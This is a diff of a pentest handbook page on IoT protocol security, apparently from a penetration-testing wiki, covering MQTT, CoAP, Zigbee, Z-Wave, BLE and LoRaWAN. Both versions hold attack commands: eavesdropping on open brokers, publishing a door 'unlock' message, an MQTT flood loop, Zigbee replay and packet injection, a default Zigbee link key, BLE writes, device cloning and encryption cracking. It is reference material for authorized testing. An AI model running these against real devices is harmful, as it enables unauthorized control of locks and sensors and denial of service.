@@ -1,5 +1,5 @@
 {
-    "title": "IoT Protocol Security",
+    "title": "IoT Protocol Security & Analysis",
     "breadcrumb": [
         {
             "title": "Others",
@@ -8,411 +8,152 @@
     ],
     "sections": [
         {
-            "heading": "MQTT (Message Queuing Telemetry Transport)",
+            "heading": "MQTT (Telemetry) Security",
             "subheadings": [
                 {
-                    "heading": "Overview",
+                    "heading": "Discovery & Anonymous Access",
                     "type": "code_block",
                     "content": [
-                        "- Port: 1883 (plain), 8883 (TLS)",
-                        "- Publish/Subscribe model",
-                        "- Used in: Smart home, ICS/SCADA, sensors",
-                        "- Broker-based architecture"
-                    ]
-                },
-                {
-                    "heading": "Discovery",
-                    "type": "code_block",
-                    "content": [
-                        "# Scan for MQTT brokers",
+                        "# Scan for MQTT brokers (1883/8883)",
                         "nmap -p 1883,8883 --script mqtt-subscribe target.com",
                         "",
-                        "# Shodan",
-                        "shodan search \"port:1883 mqtt\"",
-                        "",
-                        "# Check for anonymous access",
+                        "# Check for anonymous access using mosquitto_sub",
                         "mosquitto_sub -h target.com -t '#' -v",
                         "",
-                        "# Expected output (if vulnerable):",
-                        "# home/sensors/temperature 23.5",
-                        "# home/door/status locked",
-                        "# devices/camera/feed [binary data]"
+                        "# Shodan query for open brokers",
+                        "shodan search \"port:1883 mqtt\""
                     ]
                 },
                 {
-                    "heading": "Enumeration",
+                    "heading": "Enumeration & Topic Infiltration",
                     "type": "code_block",
                     "content": [
                         "# Subscribe to all topics (wildcard)",
                         "mosquitto_sub -h target.com -t '#' -v",
                         "",
-                        "# Subscribe to specific level",
+                        "# Monitor specific status levels",
                         "mosquitto_sub -h target.com -t '+/+/status' -v",
                         "",
-                        "# With credentials (if known)",
-                        "mosquitto_sub -h target.com -u admin -P password -t '#' -v",
-                        "",
-                        "# List topics via $SYS",
+                        "# Enumerate system topics via $SYS",
                         "mosquitto_sub -h target.com -t '$SYS/#' -v"
                     ]
                 },
                 {
-                    "heading": "Attacks",
-                    "type": "code_block",
+                    "heading": "Active Exploitation Tools",
+                    "type": "list",
                     "content": [
-                        "# Publish malicious message",
-                        "mosquitto_pub -h target.com -t 'home/door/command' -m 'unlock'",
-                        "",
-                        "# Denial of Service (flood)",
-                        "while true; do mosquitto_pub -h target.com -t 'test' -m 'flood'; done",
-                        "",
-                        "# Intercept and modify (MITM)",
-                        "# Use mitmproxy or custom broker"
-                    ]
-                },
-                {
-                    "heading": "Tools",
-                    "type": "code_block",
-                    "content": [
-                        "# MQTT Explorer (GUI)",
-                        "https://mqtt-explorer.com/",
-                        "",
-                        "# mqtt-pwn",
-                        "https://github.com/akamai-threat-research/mqtt-pwn",
-                        "python mqtt_pwn.py -b target.com -p 1883",
-                        "",
-                        "# MQTT-CLI",
-                        "mqtt sub -h target.com -t '#'"
+                        "[MQTT Explorer](https://mqtt-explorer.com/) - High-density GUI for topic visualization.",
+                        "[mqtt-pwn](https://github.com/akamai-threat-research/mqtt-pwn) - Comprehensive MQTT reconnaissance and exploitation framework.",
+                        "[mosquitto_pub](https://mosquitto.org/) - CLI for message injection and flood-based DoS."
                     ]
                 }
             ]
         },
         {
-            "heading": "CoAP (Constrained Application Protocol)",
+            "heading": "CoAP & Zigbee Security",
             "subheadings": [
                 {
-                    "heading": "Overview",
+                    "heading": "CoAP Discovery & Amplification",
                     "type": "code_block",
                     "content": [
-                        "- Port: 5683 (UDP), 5684 (DTLS)",
-                        "- REST-like for constrained devices",
-                        "- Used in: Sensors, smart meters, M2M"
-                    ]
-                },
-                {
-                    "heading": "Discovery",
-                    "type": "code_block",
-                    "content": [
-                        "# Scan for CoAP",
-                        "nmap -sU -p 5683,5684 target.com",
-                        "",
-                        "# Shodan",
-                        "shodan search \"port:5683\""
-                    ]
-                },
-                {
-                    "heading": "Enumeration",
-                    "type": "code_block",
-                    "content": [
-                        "# CoAP client",
-                        "pip install aiocoap",
-                        "",
-                        "# Discover resources",
+                        "# Discover resources on constrained devices",
                         "coap-client -m get coap://target.com/.well-known/core",
                         "",
-                        "# Expected output:",
-                        "# </sensors>;rt=\"temperature\",</actuators>;rt=\"switch\"",
+                        "# Retrieve specific sensor data",
+                        "coap-client -m get coap://target.com/sensors/temp",
                         "",
-                        "# Get resource",
-                        "coap-client -m get coap://target.com/sensors/temp"
+                        "# Resource modification (PUT)",
+                        "coap-client -m put coap://target.com/actuators/switch -e \"on\""
                     ]
                 },
                 {
-                    "heading": "Attacks",
+                    "heading": "Zigbee Sniffing & Key Extraction",
                     "type": "code_block",
                     "content": [
-                        "# Modify resource (if writable)",
-                        "coap-client -m put coap://target.com/actuators/switch -e \"on\"",
+                        "# Network discovery with KillerBee",
+                        "killerbee zbstumbler",
                         "",
-                        "# Amplification attack (DDoS)",
-                        "# CoAP can be used for amplification due to UDP"
+                        "# Capture Zigbee traffic to PCAP",
+                        "killerbee zbdump -c 11 -w capture.pcap",
+                        "",
+                        "# Inject packets using zbinject",
+                        "zbinject -c 11 -p [packet_data]"
+                    ]
+                },
+                {
+                    "heading": "Zigbee Hardware & Security Issues",
+                    "type": "list",
+                    "content": [
+                        "**Hardware**: CC2531 USB dongle, HackRF One, and YARD Stick One.",
+                        "**Vulnerabilities**: Default Trust Center Link Keys, insecure rejoin processes, and lack of replay protection.",
+                        "**KillerBee**: The industry-standard framework for Zigbee protocol manipulation."
                     ]
                 }
             ]
         },
         {
-            "heading": "Zigbee",
+            "heading": "BLE & Z-Wave Analysis",
             "subheadings": [
                 {
-                    "heading": "Overview",
+                    "heading": "BLE Service Enumeration",
                     "type": "code_block",
                     "content": [
-                        "- Frequency: 2.4 GHz (worldwide), 868 MHz (EU), 915 MHz (US)",
-                        "- Range: 10-100m",
-                        "- Used in: Smart home, lighting, sensors",
-                        "- Network types: Star, Tree, Mesh"
-                    ]
-                },
-                {
-                    "heading": "Hardware Requirements",
-                    "type": "code_block",
-                    "content": [
-                        "- CC2531 USB dongle ($10-15)",
-                        "- HackRF One",
-                        "- YARD Stick One",
-                        "- Ubertooth (can sniff 2.4 GHz)"
-                    ]
-                },
-                {
-                    "heading": "Sniffing",
-                    "type": "code_block",
-                    "content": [
-                        "# With Wireshark + CC2531",
-                        "# Flash CC2531 with sniffer firmware",
+                        "# Scan for BLE devices",
+                        "bettercap -eval \"ble.recon on\"",
                         "",
-                        "# Using KillerBee",
-                        "killerbee zbstumbler  # Find networks",
-                        "killerbee zbdump -c 11 -w capture.pcap  # Capture channel 11",
-                        "",
-                        "# Using Zigbee2MQTT (for analysis)"
-                    ]
-                },
-                {
-                    "heading": "Attacks",
-                    "type": "code_block",
-                    "content": [
-                        "# KillerBee toolkit",
-                        "# https://github.com/riverloopsec/killerbee",
-                        "",
-                        "# Replay attack",
-                        "zbdump -c 11 -w capture.pcap",
-                        "zbreplay -c 11 -r capture.pcap",
-                        "",
-                        "# Key extraction (if default key)",
-                        "# Default Trust Center Link Key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39",
-                        "",
-                        "# Inject packets",
-                        "zbgoodfind -c 11 -f capture.pcap  # Find key",
-                        "zbinject -c 11 -p [packet]  # Inject"
-                    ]
-                },
-                {
-                    "heading": "Security Issues",
-                    "type": "code_block",
-                    "content": [
-                        "- Default/weak link keys",
-                        "- No replay protection (some implementations)",
-                        "- Insecure rejoin process",
-                        "- OTA update vulnerabilities"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "Z-Wave",
-            "subheadings": [
-                {
-                    "heading": "Overview",
-                    "type": "code_block",
-                    "content": [
-                        "- Frequency: 908.42 MHz (US), 868.42 MHz (EU)",
-                        "- Range: 30-100m",
-                        "- Used in: Smart locks, thermostats, sensors",
-                        "- Proprietary but reverse-engineered"
-                    ]
-                },
-                {
-                    "heading": "Hardware",
-                    "type": "code_block",
-                    "content": [
-                        "- Z-Wave.Me UZB stick",
-                        "- RTL-SDR (limited)",
-                        "- HackRF One"
-                    ]
-                },
-                {
-                    "heading": "Attacks",
-                    "type": "code_block",
-                    "content": [
-                        "# Z-Wave uses S0, S1, S2 security",
-                        "# S0 has known vulnerabilities (key exchange flaw)",
-                        "",
-                        "# EZ-Wave tool",
-                        "# https://github.com/cureHsu/EZ-Wave",
-                        "python ez-wave.py --interface /dev/ttyACM0",
-                        "",
-                        "# Scapy-radio",
-                        "# https://github.com/BastilleResearch/scapy-radio"
-                    ]
-                },
-                {
-                    "heading": "S0 Key Extraction",
-                    "type": "code_block",
-                    "content": [
-                        "1. Force device into inclusion mode",
-                        "2. Sniff inclusion process",
-                        "3. S0 key is XORed with known constant",
-                        "4. Derive network key"
-                    ]
-                }
-            ]
-        },
-        {
-            "heading": "BLE (Bluetooth Low Energy)",
-            "subheadings": [
-                {
-                    "heading": "Overview",
-                    "type": "code_block",
-                    "content": [
-                        "- Frequency: 2.4 GHz",
-                        "- Range: ~100m",
-                        "- Used in: Fitness trackers, locks, beacons"
-                    ]
-                },
-                {
-                    "heading": "Scanning",
-                    "type": "code_block",
-                    "content": [
-                        "# hcitool (deprecated but functional)",
-                        "hcitool lescan",
-                        "",
-                        "# Expected output:",
-                        "# AA:BB:CC:DD:EE:FF Device Name",
-                        "# 11:22:33:44:55:66 (unknown)",
-                        "",
-                        "# bluetoothctl",
-                        "bluetoothctl",
-                        "[bluetooth]# scan on",
-                        "",
-                        "# bettercap",
-                        "bettercap -eval \"ble.recon on\""
-                    ]
-                },
-                {
-                    "heading": "Enumeration",
-                    "type": "code_block",
-                    "content": [
-                        "# Connect and enumerate services",
+                        "# Connect and enumerate GATT services",
                         "gatttool -b AA:BB:CC:DD:EE:FF -I",
                         "[AA:BB:CC:DD:EE:FF][LE]> connect",
                         "[AA:BB:CC:DD:EE:FF][LE]> primary",
-                        "# Lists services",
-                        "",
-                        "[AA:BB:CC:DD:EE:FF][LE]> characteristics",
-                        "# Lists characteristics",
-                        "",
-                        "[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0016",
-                        "# Read characteristic value"
+                        "[AA:BB:CC:DD:EE:FF][LE]> characteristics"
                     ]
                 },
                 {
-                    "heading": "Attacks",
-                    "type": "code_block",
+                    "heading": "Z-Wave S0 Key Extraction",
+                    "type": "list",
                     "content": [
-                        "# GATT attacks with gattacker",
-                        "# https://github.com/securing/gattacker",
-                        "node scan.js",
-                        "node advertise.js -a config.json  # Clone device",
-                        "",
-                        "# BLE spoofing with bettercap",
-                        "bettercap",
-                        "ble.recon on",
-                        "ble.enum AA:BB:CC:DD:EE:FF",
-                        "ble.write AA:BB:CC:DD:EE:FF 0x0016 01  # Write to characteristic",
-                        "",
-                        "# Crackle - Crack BLE encryption",
-                        "# https://github.com/mikeryan/crackle",
-                        "crackle -i capture.pcap -o decrypted.pcap"
-                    ]
-                },
-                {
-                    "heading": "Common Vulnerabilities",
-                    "type": "code_block",
-                    "content": [
-                        "- Static/weak pairing keys",
-                        "- Lack of encryption",
-                        "- MITM during pairing",
-                        "- Replay attacks",
-                        "- Unauthorized characteristic access"
+                        "**Key Exchange Flaw**: S0 security features a known flaw where the network key is XORed with a constant during inclusion.",
+                        "**Tools**: [EZ-Wave](https://github.com/cureHsu/EZ-Wave) for interface manipulation and packet injection.",
+                        "**Hardware**: Z-Wave.Me UZB stick or specialized HackRF configurations."
                     ]
                 }
             ]
         },
         {
-            "heading": "LoRaWAN",
+            "heading": "LoRaWAN & Low-Level Hardware",
             "subheadings": [
                 {
-                    "heading": "Overview",
-                    "type": "code_block",
+                    "heading": "LoRaWAN Attack Vectors",
+                    "type": "list",
                     "content": [
-                        "- Frequency: 868 MHz (EU), 915 MHz (US), 433 MHz (Asia)",
-                        "- Range: 2-15 km",
-                        "- Used in: Smart cities, agriculture, utilities"
+                        "**Replay Attacks**: Join-request replay and ACK spoofing in the absence of frame counters.",
+                        "**Bit-Flipping**: Manipulating traffic data when integrity checks are misconfigured.",
+                        "**Traffic Analysis**: Using [gr-lora](https://github.com/rpp0/gr-lora) for signal processing and decryption."
                     ]
                 },
                 {
-                    "heading": "Hardware",
+                    "heading": "General IoT Firmware Analysis",
                     "type": "code_block",
                     "content": [
-                        "- RTL-SDR + LoRa receiver",
-                        "- HackRF One",
-                        "- Dedicated LoRa gateway"
-                    ]
-                },
-                {
-                    "heading": "Security Architecture",
-                    "type": "code_block",
-                    "content": [
-                        "- AppKey: Application key (shared secret)",
-                        "- NwkSKey: Network session key",
-                        "- AppSKey: Application session key",
-                        "- DevAddr: Device address",
+                        "# Extract filesystem from firmware blob",
+                        "binwalk -e firmware.bin",
                         "",
-                        "Encryption: AES-128"
-                    ]
-                },
-                {
-                    "heading": "Attacks",
-                    "type": "code_block",
-                    "content": [
-                        "# LoRa traffic analysis",
-                        "# https://github.com/rpp0/gr-lora",
+                        "# Modify and repack firmware",
+                        "firmware-mod-kit (fmk)",
                         "",
-                        "# Replay attacks (if no frame counter)",
-                        "# ACK spoofing",
-                        "# Bit-flipping attacks (if no integrity check)",
-                        "",
-                        "# Join request replay",
-                        "# If DevNonce not checked, can replay join requests"
+                        "# Protocol analysis with Scapy",
+                        "scapy  # Custom parsing for proprietary protocols"
                     ]
                 }
             ]
         },
         {
-            "heading": "General IoT Testing Tools",
-            "type": "code_block",
-            "content": [
-                "# Firmware analysis",
-                "binwalk -e firmware.bin",
-                "firmware-mod-kit",
-                "",
-                "# Protocol analysis",
-                "Wireshark + dissectors",
-                "scapy (custom protocol parsing)",
-                "",
-                "# Radio",
-                "GNU Radio",
-                "Universal Radio Hacker (URH)",
-                "SDR# / GQRX"
-            ]
-        },
-        {
-            "heading": "Related Topics",
+            "heading": "Related Testing Modules",
             "type": "list",
             "content": [
-                "Wireless Testing - WiFi, general wireless",
-                "Hardware Hacking - Physical device testing",
-                "Network Scanning - Network discovery"
+                "[Wireless Security](wireless.md) - WiFi and general RF testing.",
+                "[Hardware Hacking](hardware.md) - Physical device exploitation and UART/JTAG.",
+                "[Network Scanning](../recon/network-scanning.md) - Asset discovery and port auditing."
             ]
         }
     ],
@@ -420,34 +161,18 @@
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-02-03T14:05:45.496Z",
+        "last_updated": "2026-04-23T02:05:00.000Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/others/iot-protocols.md",
         "previous_page": {
-            "title": "Purple Team",
+            "title": "Purple Teaming",
             "url": "/others/purple-team"
         },
         "next_page": {
-            "title": "Automotive Security",
-            "url": "/others/automotive-security"
+            "title": "Post-Exploitation",
+            "url": "/post-exploitation"
         }
     }
 }
